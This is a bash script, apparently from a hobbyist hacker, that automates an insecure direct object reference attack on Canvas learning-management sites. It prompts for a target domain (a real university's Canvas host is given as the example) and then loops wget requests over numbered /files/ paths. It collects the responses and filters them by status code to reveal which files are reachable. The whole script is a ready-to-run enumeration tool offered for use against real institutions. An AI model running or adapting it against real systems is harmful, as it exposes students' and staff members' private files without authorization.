#!/bin/bash 
#A quick little bashscript by n3on @n3onhacks

#Menu
echo "CIDOR - Canvas IDOR checker v.1"
echo "Usage: checks domain/[num]/files to check for accessible files via Canvas IDOR (CIDOR) issue"
echo "...cleaning previous results..."

#Clearing Out Previous Files
> cidor_results.txt
> times.txt
> times_final.txt
> Updated_Results.txt
> Final_Results.sh

#Target Selection, Options
echo "SELECT your TARGET (ex: canvas.uchicago.edu):"
read DOMAIN
echo "What number would you like to loop until (ex: 300):"
read NUMBER
echo "..::Starting Canvas IDOR::.."
                                                               
#URL Layout Options
a="https://"
b=$DOMAIN
c="/"
d=1
e="/files/"
f="cidor_results.txt"
g=$NUMBER
target=${a}${b}${c}${d}${e}

#Loop for IDOR by numbers 
for ((d=1; d<=${g}; d++))
do
	wget --append-output=${f} ${a}${b}${c}${d}${e}
	echo ${a}${b}${c}${d}${e}
	done

#Pre-results
echo "Completed. Querying through logs....."
echo "What responses would you like to view? (Ex: 200)"
read SELECTED
h=$SELECTED
cat cidor_results.txt | grep ${h} | cut -d " " -f 2 | tr -d "" > times.txt 
echo "Loading results"
echo "[0000xxxxxxxxxxxxxxxx]"
echo "[000000000xxxxxxxxxxx]"
echo "[000000000000xxxxxxxx]"
echo "[0000000000000000xxxx]"
echo "[00000000000000000000]"

#Cleanup times.txt prior to creating cidor_times.sh file for results.
grep -v "request" times.txt > times_final.txt

#Make Final_Results.sh
File="times_final.txt"
echo "#!/bin/bash" > Final_Results.sh
Lines=$(cat $File)
for Line in $Lines
do
echo "cat cidor_results.txt | grep '$Line'" > Updated_Results.txt
cat Updated_Results.txt | uniq > Final_Results.sh
chmod +x Final_Results.sh
./Final_Results.sh

echo "View full results at cidor_results.txt"

	done
